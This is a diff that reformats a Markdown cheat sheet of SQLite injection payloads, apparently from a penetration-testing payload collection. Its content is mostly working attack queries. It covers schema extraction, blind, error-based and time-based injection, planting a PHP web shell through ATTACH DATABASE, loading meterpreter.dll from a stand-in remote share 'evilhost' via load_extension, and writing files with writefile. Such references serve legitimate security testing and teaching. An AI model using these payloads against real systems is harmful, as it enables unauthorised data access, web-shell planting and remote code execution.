@@ -1,7 +1,6 @@
 # SQLite Injection
 
-> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues. 
-
+> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.
 
 ## Summary
 
@@ -17,11 +16,10 @@
 * [SQlite Remote Code Execution](#sqlite-remote-code-execution)
     * [Attach Database](#attach-database)
     * [Load_extension](#load_extension)
-* [SQLite File Manipulation](#SQLite-file-manipulation)
-    * [SQLite Read File](#SQLite-read-file)
-    * [SQLite Write File](#SQLite-write-file)
+* [SQLite File Manipulation](#sqlite-file-manipulation)
+    * [SQLite Read File](#sqlite-read-file)
+    * [SQLite Write File](#sqlite-write-file)
 * [References](#references)
-
 
 ## SQLite Comments
 
@@ -30,20 +28,18 @@
 | Single-Line Comment | `--`    |
 | Multi-Line Comment  | `/**/`  |
 
-
 ## SQLite Enumeration
 
 | Description   | SQL Query |
 | ------------- | ----------------------------------------- |
 | DBMS version  | `select sqlite_version();`                |
 
-
 ## SQLite String
 
 ### SQLite String Methodology
 
 | Description             | SQL Query                                 |
-| ----------------------- | ----------------------------------------- | 
+| ----------------------- | ----------------------------------------- |
 | Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
 | Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
 | Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
@@ -53,26 +49,23 @@
 | Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
 | Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |
 
-
 ## SQLite Blind
 
 ### SQLite Blind Methodology
 
 | Description             | SQL Query                                 |
-| ----------------------- | ----------------------------------------- | 
-| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` | 
-| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` | 
-| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` | 
-| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` | 
-
+| ----------------------- | ----------------------------------------- |
+| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
+| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
+| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
+| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |
 
 ### SQLite Blind With Substring Equivalent
 
 | Function    | Example                                   |
-| ----------- | ----------------------------------------- | 
-| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  | 
-| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     | 
-
+| ----------- | ----------------------------------------- |
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |
 
 ## SQlite Error Based
 
@@ -80,14 +73,12 @@
 AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
 ```
 
-
 ## SQlite Time Based
 
 ```sql
 AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ```
-
 
 ## SQLite Remote Code Execution
 
@@ -107,20 +98,17 @@ INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
 ```
 
-
 ## SQLite File Manipulation
 
 ### SQLite Read File
 
 SQLite does not support file I/O operations by default.
 
-
 ### SQLite Write File
 
 ```sql
 SELECT writefile('/path/to/file', column_name) FROM table_name
 ```
-
 
 ## References
 
